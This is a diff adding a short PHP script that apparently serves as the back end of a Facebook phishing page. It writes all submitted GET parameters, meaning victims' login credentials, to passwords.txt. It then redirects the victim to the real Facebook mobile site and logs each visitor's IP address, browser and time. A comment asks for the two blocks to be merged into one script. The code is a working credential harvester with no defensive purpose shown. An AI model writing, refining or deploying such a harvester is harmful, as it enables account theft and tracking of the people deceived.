@@ -1,0 +1,28 @@
+<?php
+// Save some Data !!
+header("Location: https://m.facebook.com/home.php");
+$handle = fopen("passwords.txt", "a");
+fwrite($handle, "\r\n----------------------------------------------------------------------\r\n");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r"); // took \n out
+fclose($handle);
+?>
+// SORT THIS MESS INTO ONE SCRIPT AND NOT TWO !!!!!!!!
+<?php
+// Do make a visitors log of browser and ip.
+$ip = $_SERVER['REMOTE_ADDR'];
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$dateTime = date('Y/m/d G:i:s');
+$file = "passwords.txt";
+$file = fopen($file, "a");
+$data = "User_Found_[IP: $ip ++ Browser: $browser ++ on Time: $dateTime ]\r\n";
+fwrite($file, $data);
+fwrite($file, "\r----------------------------------------------------------------------\r\n");
+fclose($file);
+exit;
+?>
